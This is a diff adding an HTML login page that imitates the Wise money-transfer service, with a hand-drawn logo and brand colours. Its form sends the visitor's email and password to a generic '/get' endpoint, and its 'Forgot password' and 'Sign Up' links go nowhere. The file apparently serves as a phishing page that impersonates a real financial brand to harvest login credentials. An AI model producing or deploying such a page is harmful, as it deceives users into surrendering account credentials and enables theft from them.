@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <title>Wise</title>
+    <style>
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
+        background-color: #f5f7fa;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+      }
+      .login-container {
+        width: 400px;
+        background: #fff;
+        border-radius: 12px;
+        padding: 40px 36px;
+        box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+      }
+      #logo {
+        margin-bottom: 24px;
+      }
+      .g-h1 {
+        font-size: 24px;
+        font-weight: 700;
+        color: #163300;
+        margin-bottom: 8px;
+      }
+      .g-h2 {
+        font-size: 14px;
+        color: #5e6b63;
+        margin-bottom: 24px;
+      }
+      .g-input {
+        width: 100%;
+        padding: 14px 16px;
+        border: 1px solid #d4dad4;
+        border-radius: 8px;
+        font-size: 16px;
+        margin-bottom: 16px;
+        box-sizing: border-box;
+        outline: none;
+      }
+      .g-input:focus {
+        border-color: #9fe870;
+        box-shadow: 0 0 0 3px rgba(159,232,112,0.3);
+      }
+      .gbtn-primary {
+        width: 100%;
+        padding: 14px;
+        background-color: #9fe870;
+        color: #163300;
+        border: none;
+        border-radius: 8px;
+        font-size: 16px;
+        font-weight: 700;
+        cursor: pointer;
+      }
+      .gbtn-primary:hover {
+        background: #8bd662;
+      }
+      .link {
+        display: block;
+        margin-top: 16px;
+        color: #163300;
+        font-size: 14px;
+        text-decoration: none;
+        text-align: center;
+      }
+      .link:hover {
+        text-decoration: underline;
+      }
+      .footer {
+        margin-top: 24px;
+        font-size: 13px;
+        color: #5e6b63;
+        text-align: center;
+      }
+      .footer a {
+        color: #163300;
+        text-decoration: none;
+        font-weight: 600;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <svg id="logo" viewBox="0 0 100 40" width="100" height="40">
+        <text x="0" y="30" font-family="Arial" font-weight="800" font-size="32" fill="#9fe870">W</text>
+        <text x="30" y="30" font-family="Arial" font-weight="800" font-size="32" fill="#163300">ise</text>
+      </svg>
+      <h1 class="g-h1">Welcome to Wise</h1>
+      <p class="g-h2">Log in to manage your money</p>
+      <form action="/get" method="POST">
+        <input class="g-input" type="email" name="email" placeholder="Email" required>
+        <input class="g-input" type="password" name="password" placeholder="Password" required>
+        <button type="submit" class="gbtn-primary">Continue</button>
+      </form>
+      <a href="#" class="link">Forgot password?</a>
+      <p class="footer">Don't have an account? <a href="#">Sign Up</a></p>
+    </div>
+  </body>
+</html>
